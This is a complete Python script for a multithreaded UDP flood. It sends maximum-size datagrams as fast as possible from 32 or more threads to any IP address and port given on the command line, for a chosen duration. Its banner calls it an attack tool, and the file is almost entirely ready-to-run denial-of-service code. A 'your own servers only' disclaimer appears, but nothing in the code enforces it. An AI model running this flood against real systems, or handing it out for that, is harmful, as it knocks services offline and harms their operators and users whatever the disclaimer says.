#!/usr/bin/env python
"""
High-Performance UDP Flood Tool for Network Testing
For testing your own servers only
"""

import socket
import sys
import time
import random
import string
import threading

# Generate a single large payload once to reuse
def generate_random_data(size=65507):  # Maximum UDP packet size
    """Generate random string data of specified size."""
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(size))

# Pre-generate payload for maximum performance
PAYLOAD = generate_random_data().encode('utf-8')

def send_udp_packets(target_ip, port, duration, thread_id=0):
    """Send UDP packets to the target IP and port at maximum rate."""
    # Create UDP socket with optimized buffer
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507 * 1024)  # Larger send buffer
    
    # Calculate end time
    end_time = time.time() + duration
    packets_sent = 0
    
    print("[*] Thread %d starting attack to %s:%s" % (thread_id, target_ip, port))
    
    start_time = time.time()
    
    try:
        # Send packets until duration is reached - as fast as possible
        while time.time() < end_time:
            try:
                sock.sendto(PAYLOAD, (target_ip, port))
                packets_sent += 1
                
                # Print status every 100000 packets (only from thread 0)
                if thread_id == 0 and packets_sent % 100000 == 0:
                    elapsed = time.time() - start_time
                    print("[+] Sent %s packets in %.2f seconds (%.2f packets/sec)" % 
                          (packets_sent, elapsed, packets_sent/elapsed))
            except:
                # Just continue if any error occurs
                continue
            
    except KeyboardInterrupt:
        print("\n[!] Test interrupted by user")
    finally:
        # Close the socket
        sock.close()
        
        # Return statistics
        total_time = time.time() - start_time
        return packets_sent, total_time, len(PAYLOAD) * packets_sent

def run_threads(target_ip, port, duration, num_threads=32):
    """Run multiple threads for maximum performance testing."""
    threads = []
    
    print("[*] Starting attack with %d threads" % num_threads)
    print("[*] Packet size: %d bytes (maximum)" % len(PAYLOAD))
    print("[*] Target: %s:%s" % (target_ip, port))
    print("[*] Duration: %d seconds" % duration)
    print("[*] Press Ctrl+C to stop before the duration completes")
    
    # Start all threads
    for i in range(num_threads):
        thread = threading.Thread(
            target=send_udp_packets,
            args=(target_ip, port, duration, i)
        )
        thread.daemon = True  # Set as daemon so they exit when main thread exits
        threads.append(thread)
        thread.start()
    
    # Wait for duration
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    
    # Final status message
    print("\n[*] Attack completed")

def main():
    """Main function to parse arguments and start the test."""
    if len(sys.argv) < 4:
        print("Usage: python test.py <target_ip> <port> <duration> [threads]")
        print("Example: python test.py 192.168.1.100 8080 30 64")
        sys.exit(1)
    
    # Parse command line arguments
    target_ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    
    # Optional thread count (default to 32 for maximum performance)
    num_threads = int(sys.argv[4]) if len(sys.argv) > 4 else 32
    
    # Validate inputs
    if port < 1 or port > 65535:
        print("[!] Error: Port must be between 1 and 65535")
        sys.exit(1)
        
    if duration < 1:
        print("[!] Error: Duration must be at least 1 second")
        sys.exit(1)
    
    # Display warning
    print("\n" + "="*60)
    print("HIGH-PERFORMANCE UDP ATTACK TOOL")
    print("WARNING: This tool is for legitimate network testing purposes only.")
    print("You should only use this against servers you own or have permission to test.")
    print("="*60 + "\n")
    
    # Start the test with maximum performance
    run_threads(target_ip, port, duration, num_threads)

if __name__ == "__main__":
    main()
